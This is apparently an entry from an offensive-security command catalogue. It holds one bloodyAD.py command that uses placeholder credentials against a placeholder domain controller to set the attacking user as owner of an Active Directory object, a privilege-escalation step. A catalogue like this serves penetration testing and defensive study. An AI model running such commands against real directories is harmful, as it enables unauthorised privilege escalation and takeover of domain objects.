---
id: 5ab2148a-1f7c-4e3a-9aeb-fccdd0520ca7
name: Set Owner of target_object to devil_user1
type: command
executor: bash
data: bloodyAD.py --host my.dc.corp -d corp -u devil_user1 -p P@ssword123 setOwner
  devil_user1 target_object
output: null
created_at: '2023-04-06T03:56:06.890512+00:00'
updated_at: '2023-04-10T20:26:31.170427+00:00'
---

# Set Owner of target_object to devil_user1

```bash
bloodyAD.py --host my.dc.corp -d corp -u devil_user1 -p P@ssword123 setOwner devil_user1 target_object
```


